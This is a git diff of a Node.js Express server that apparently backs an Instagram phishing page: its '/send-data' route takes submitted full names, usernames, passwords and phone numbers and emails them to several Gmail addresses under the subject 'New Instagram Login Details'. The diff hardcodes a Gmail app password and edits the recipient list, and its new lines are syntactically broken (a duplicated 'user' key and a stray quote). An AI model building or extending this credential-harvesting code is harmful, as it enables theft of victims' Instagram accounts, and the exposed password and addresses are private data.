@@ -15,12 +15,13 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Nodemailer setup (Sender email jiske App Password se mail jayegi)
+// Nodemailer setup
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'myaqoobbhurgri4@gmail.com', // Sahi Gmail (bina extra dot ke)
-        pass: 'mcfn tmzh qnxd ghaa'       // App Password
+        user: 'myaqoobbhurgri4@gmail.com.',
+        user: 'lagharitahir08@gmail.com.',
+        pass: 'mcfn tmzh qnxd ghaa' // App Password
     }
 });
 
@@ -28,9 +29,8 @@ app.post('/send-data', (req, res) => {
     const { fullname, username, password, phone } = req.body;
 
     const mailOptions = {
-        from: 'myaqoobbhurgri4@gmail.com', 
-        // Comma (,) laga kar dono logon ke emails likhein:
-        to: 'myaqoobbhurgri4@gmail.com, lagharitahir08@gmail.com',
+        from: 'lagharitahir08@gmail.com',
+        to: 'lagharitahir08@gmail.com',tahirlaghari094@gmail.com',
         subject: 'New Instagram Login Details',
         text: `Nayi Login Details aayi hain:
         
